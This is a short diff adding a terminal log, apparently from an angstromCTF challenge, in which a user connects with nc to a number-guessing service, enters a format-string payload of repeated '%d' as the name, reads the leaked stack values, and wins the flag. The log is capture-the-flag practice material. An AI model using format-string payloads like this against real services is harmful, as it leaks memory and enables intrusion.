@@ -1,0 +1,7 @@
+user@8b70fc4c21c5 /data $ nc shell.angstromctf.com 1235
+Welcome to the number guessing game!
+Before we begin, please enter your name (40 chars max):
+%d %d %d %d %d %d %d %d %d
+I'm thinking of two random numbers (0 to 1000000), can you tell me their sum?
+1807595388 228 111827 -452935516 -452935392 1807595704 0 4196944 520676's guess: 632503
+Congrats, here's a flag: actf{format_stringz_are_pre77y_sc4ry}
